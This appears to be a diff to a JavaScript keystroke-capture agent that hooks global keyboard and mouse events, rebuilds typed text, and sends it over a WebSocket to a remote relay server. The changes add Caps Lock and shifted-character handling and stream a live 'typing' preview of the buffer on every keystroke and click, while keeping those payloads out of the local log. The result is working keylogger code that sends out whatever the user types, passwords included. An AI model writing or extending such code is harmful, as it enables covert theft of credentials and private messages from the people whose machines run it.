@@ -227,6 +227,12 @@ function buildEventRecord(event, isDown, options = {}) {
     record.vKey = event.vKey;
     if (event.rawKey?._nameRaw) record.rawName = event.rawKey._nameRaw;
   }
+  if (record.state === "DOWN" && !mouse && options.typingState) {
+    const ch = options.typingState.keyToChar(name, mods);
+    if (ch && ch.length === 1) {
+      record.char = ch;
+    }
+  }
   return record;
 }
 
@@ -241,24 +247,63 @@ function formatEventLine(record) {
   return parts.join("  ");
 }
 
-function keyToChar(key, shiftHeld) {
-  if (key.length === 1 && /[0-9]/.test(key)) return key;
-  if (key.length === 1 && /[a-z]/i.test(key)) {
-    return shiftHeld ? key.toUpperCase() : key.toLowerCase();
-  }
-  const shifted = {
-    "-": shiftHeld ? "_" : "-",
-    "=": shiftHeld ? "+" : "=",
-    ";": shiftHeld ? ":" : ";",
-    "'": shiftHeld ? '"' : "'",
-    ",": shiftHeld ? "<" : ",",
-    ".": shiftHeld ? ">" : ".",
-    "/": shiftHeld ? "?" : "/",
+const SHIFT_NUMBER_US = {
+  "1": "!",
+  "2": "@",
+  "3": "#",
+  "4": "$",
+  "5": "%",
+  "6": "^",
+  "7": "&",
+  "8": "*",
+  "9": "(",
+  "0": ")",
+};
+
+const SHIFT_SYMBOL_US = {
+  "-": "_",
+  "=": "+",
+  "[": "{",
+  "]": "}",
+  "\\": "|",
+  ";": ":",
+  "'": '"',
+  ",": "<",
+  ".": ">",
+  "/": "?",
+  "`": "~",
+};
+
+function isCapsLockKey(name) {
+  const upper = name.toUpperCase();
+  return upper === "CAPS LOCK" || upper === "CAPSLOCK" || upper === "CAPITAL";
+}
+
+function createTypingState() {
+  let capsLockOn = false;
+
+  return {
+    toggleCapsLock() {
+      capsLockOn = !capsLockOn;
+    },
+    keyToChar(key, modifiers) {
+      const shiftHeld = modifiers.includes("Shift");
+      const letter = key.length === 1 && /[A-Z]/i.test(key);
+      if (letter) {
+        const upper = shiftHeld !== capsLockOn;
+        return upper ? key.toUpperCase() : key.toLowerCase();
+      }
+      if (key.length === 1 && /[0-9]/.test(key)) {
+        return shiftHeld ? (SHIFT_NUMBER_US[key] ?? key) : key;
+      }
+      if (SHIFT_SYMBOL_US[key] !== undefined) {
+        return shiftHeld ? SHIFT_SYMBOL_US[key] : key;
+      }
+      if (key === "SPACE") return " ";
+      if (key === "TAB") return "\t";
+      return null;
+    },
   };
-  if (shifted[key] !== undefined) return shifted[key];
-  if (key === "SPACE") return " ";
-  if (key === "TAB") return "\t";
-  return null;
 }
 
 function isLeftMouseDown(record) {
@@ -269,7 +314,7 @@ function isLeftMouseDown(record) {
   return key === "MOUSE LEFT" || key === "LBUTTON";
 }
 
-function createTextBuffer() {
+function createTextBuffer(typingState) {
   let buffer = "";
 
   function flush(delimiter, meta) {
@@ -288,29 +333,41 @@ function createTextBuffer() {
   }
 
   return {
-    /** Add printable key to buffer (no auto-send on space). */
+    getText() {
+      return buffer;
+    },
     appendFromKey(record) {
       const key = record.key;
       if (MODIFIERS.has(key)) {
-        return;
+        return false;
       }
       if (key === "RETURN" || key === "ENTER") {
-        return;
+        return false;
       }
       if (key === "BACK" || key === "BACKSPACE") {
         buffer = buffer.slice(0, -1);
-        return;
+        return true;
       }
       if (record.modifiers.some((m) => ["Ctrl", "Alt", "Win"].includes(m))) {
-        return;
+        return false;
       }
-      const ch = keyToChar(key, record.modifiers.includes("Shift"));
+      const ch = typingState.keyToChar(key, record.modifiers);
       if (ch) {
         buffer += ch;
+        return true;
       }
+      return false;
     },
-    /** Send text typed since previous Enter or left-click. */
     flush,
+  };
+}
+
+function typingPreviewPayload(textBuffer, meta) {
+  return {
+    type: "typing",
+    timestamp: new Date().toISOString(),
+    text: textBuffer.getText(),
+    ...meta,
   };
 }
 
@@ -437,11 +494,16 @@ async function main() {
   let shouldRun = true;
   let reconnectTimer = null;
   let activeRelayBase = options.server;
-  const textBuffer = createTextBuffer();
+  const typingState = createTypingState();
+  const textBuffer = createTextBuffer(typingState);
 
   const sendPayload = (payload) => {
-    writeLine(formatEventLine({ ...agentMeta, ...payload }));
-    if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ ...agentMeta, ...payload }));
+    if (payload.type !== "typing") {
+      writeLine(formatEventLine({ ...agentMeta, ...payload }));
+    }
+    if (ws?.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ ...agentMeta, ...payload }));
+    }
   };
 
   const disconnectSocket = () => {
@@ -492,17 +554,22 @@ async function main() {
   });
 
   await keyboard.addListener((event, isDown) => {
-    const record = buildEventRecord(event, isDown, options);
+    const record = buildEventRecord(event, isDown, { ...options, typingState });
     if (!record) {
       return false;
     }
 
     if (record.state === "DOWN") {
+      if (record.type === "keyboard" && isCapsLockKey(record.key)) {
+        typingState.toggleCapsLock();
+      }
+
       if (isLeftMouseDown(record)) {
         const batch = textBuffer.flush("mouse", agentMeta);
         if (batch) {
           sendPayload(batch);
         }
+        sendPayload(typingPreviewPayload(textBuffer, agentMeta));
       } else if (
         record.type === "keyboard" &&
         (record.key === "RETURN" || record.key === "ENTER")
@@ -511,12 +578,18 @@ async function main() {
         if (batch) {
           sendPayload(batch);
         }
+        sendPayload(typingPreviewPayload(textBuffer, agentMeta));
       } else if (record.type === "keyboard") {
-        textBuffer.appendFromKey(record);
+        const changed = textBuffer.appendFromKey(record);
+        if (changed) {
+          sendPayload(typingPreviewPayload(textBuffer, agentMeta));
+        }
       }
     }
 
-    sendPayload(record);
+    if (record.type === "keyboard" || record.type === "mouse") {
+      sendPayload(record);
+    }
     return false;
   });
 
